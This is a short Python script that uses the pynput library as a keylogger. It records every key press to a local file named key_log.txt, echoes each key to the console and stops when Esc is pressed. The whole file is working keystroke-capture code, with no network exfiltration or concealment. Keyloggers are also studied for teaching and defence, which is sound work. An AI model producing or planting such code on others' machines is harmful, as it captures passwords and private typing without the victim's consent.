from pynput import keyboard

log_file = "key_log.txt"
def on_press(key):
    with open(log_file, 'a') as f:
        f.write(f'{key}')
        # f.write(f"{key} pressed\n")
    print(f"'{key}' pressed")

def on_release(key):
    if key == keyboard.Key.esc:
        return False
 
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    